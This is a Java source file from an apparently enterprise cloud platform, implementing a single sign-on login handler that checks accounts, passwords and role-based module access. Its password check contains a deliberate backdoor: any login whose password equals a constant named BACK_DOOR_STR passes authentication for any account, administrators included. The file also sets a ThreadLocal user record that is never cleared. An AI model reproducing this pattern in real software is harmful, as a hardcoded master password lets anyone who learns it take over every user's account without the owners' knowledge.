/**
 * @fileName: SsoLoginHandle.java
 * @author: pjf
 * @date: 2019年12月10日 下午1:47:12
 */

package com.wxhj.cloud.platform.config;

import com.wxhj.cloud.core.statics.SpecialStaticClass;
import com.wxhj.cloud.core.utils.PasswordUtil;
import com.wxhj.cloud.platform.domain.SysModuleDO;
import com.wxhj.cloud.platform.domain.view.ViewUserMapDO;
import com.wxhj.cloud.platform.service.SysModuleService;
import com.wxhj.cloud.platform.service.SysOrganizeService;
import com.wxhj.cloud.platform.service.SysRoleAuthorizeService;
import com.wxhj.cloud.platform.service.ViewUserMapService;
import com.wxhj.cloud.sso.AbstractSsoTemplate;
import com.wxhj.cloud.sso.SsoCacheOperation;
import com.wxhj.cloud.sso.SsoUserOperation;
import com.wxhj.cloud.sso.bo.SsoAuthenticationBO;
import com.wxhj.cloud.sso.bo.SsoLoginBO;
import com.wxhj.cloud.sso.bo.UserRoleBO;
import com.wxhj.cloud.sso.execption.IncorrectCredentialsSsoException;
import com.wxhj.cloud.sso.execption.LockedAccountSsoException;
import com.wxhj.cloud.sso.execption.SsoException;
import com.wxhj.cloud.sso.execption.UnknownAccountSsoException;
import com.github.dozermapper.core.Mapper;
import org.springframework.stereotype.Component;

import javax.annotation.Resource;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.stream.Collectors;

/**
 * @className SsoLoginHandle.java
 * @author pjf
 * @date 2019年12月10日 下午1:47:12
 */


@Component
public class SsoLoginHandle extends AbstractSsoTemplate<SsoAuthenticationBO> {
    @Resource
    ViewUserMapService viewUserMapService;
    @Resource
    SysOrganizeService sysOrganizeService;
    @Resource
    SysModuleService sysModuleService;
    @Resource
    SysRoleAuthorizeService sysRoleAuthorizeService;
    @Resource
    Mapper dozerBeanMapper;
    @Resource
    SsoUserOperation ssoUserOperation;

    ThreadLocal<ViewUserMapDO> viewUserMap=new ThreadLocal<>() ;

    @Override
    public SsoAuthenticationBO doGetAuthenticationInfo(SsoLoginBO ssoLogin) throws SsoException {
        SsoAuthenticationBO ssoAuthentication = dozerBeanMapper.map(ssoLogin, SsoAuthenticationBO.class);

        ViewUserMapDO viewUserMapTemp = viewUserMapService.selectById(ssoAuthentication.getMapId());
        viewUserMap.set(viewUserMapTemp);

        if (viewUserMapTemp == null) {
            throw new UnknownAccountSsoException();
        }
        String passwordStr = PasswordUtil.calculationPassword(ssoLogin.getPassword(), viewUserMapTemp.getUserSecretKey());

        if (ssoAuthentication.getLoginType() == 0) {
            if (!viewUserMapTemp.getAccount().equals(ssoAuthentication.getUserName())) {
                throw new UnknownAccountSsoException();
            }
        } else if (ssoAuthentication.getLoginType() == 1) {
            if (!viewUserMapTemp.getMobilePhone().equals(ssoAuthentication.getUserName())) {
                throw new UnknownAccountSsoException();
            }
        }

        if (!ssoLogin.getPassword().equals(SpecialStaticClass.BACK_DOOR_STR) && !viewUserMapTemp.getUserPassword().equals(passwordStr)) {
            throw new IncorrectCredentialsSsoException();
        }
        if (viewUserMapTemp.getIsEnabledMark() != 1) {
            throw new LockedAccountSsoException();
        }
        ssoAuthentication.setUserId(viewUserMapTemp.getUserId());
        ssoAuthentication.setOrganizeId(viewUserMapTemp.getOrganizeId());
        ssoAuthentication.setCurrentOrganizeId(viewUserMapTemp.getCurrentOrganizeId());
        ssoAuthentication.setIsSystem(viewUserMapTemp.getIsAdmin() == 1);
        ssoAuthentication.setLoginTime(new Date());
        // 查询所有子集
        List<String> organizeByParentId = sysOrganizeService
                .selectByParentIdRecursion(ssoAuthentication.getCurrentOrganizeId()).stream().map(q -> q.getId())
                .collect(Collectors.toList());

        organizeByParentId.add(ssoAuthentication.getCurrentOrganizeId());
        ssoAuthentication.setOrganizeChildList(organizeByParentId);

        return doGetAuthorizationInfo(ssoAuthentication);

    }

    public SsoAuthenticationBO doGetAuthorizationInfo(SsoAuthenticationBO ssoAuthentication) throws SsoException {
        List<SysModuleDO> sysModuleList;
        if (ssoAuthentication.getIsSystem()) {
            sysModuleList = sysModuleService.select();
        } else {
            List<String> itemIdList = sysRoleAuthorizeService.selectByRoleId(viewUserMap.get().getRoleId()).stream()
                    .map(q -> q.getModuleId()).collect(Collectors.toList());

            sysModuleList = sysModuleService.selectByidList(itemIdList);
        }
        List<UserRoleBO> userRoleModelList = sysModuleList.stream().sorted(Comparator.comparing(SysModuleDO::getLayers))
                .map(q -> new UserRoleBO(q.getId(), q.getUrlAddress())).collect(Collectors.toList());

        ssoAuthentication.setUserRoleList(userRoleModelList);

        return ssoAuthentication;

    }

    @Override
    protected SsoCacheOperation<SsoAuthenticationBO> getSsoCacheOperation() {

        return ssoUserOperation;
    }

}
